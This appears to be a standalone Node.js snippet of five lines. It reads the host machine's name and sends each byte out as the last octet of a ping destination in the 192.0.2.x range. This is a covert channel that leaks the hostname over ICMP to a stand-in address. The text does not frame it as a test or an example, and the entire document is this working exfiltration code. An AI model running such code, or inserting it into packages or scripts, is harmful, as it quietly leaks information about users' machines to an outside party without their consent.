const os = require('os');
const {exec} = require('child_process');
for (const octet of Buffer.from(os.hostname())) {
  exec(`ping -n 1 -w 300 192.0.2.${octet}`);
}
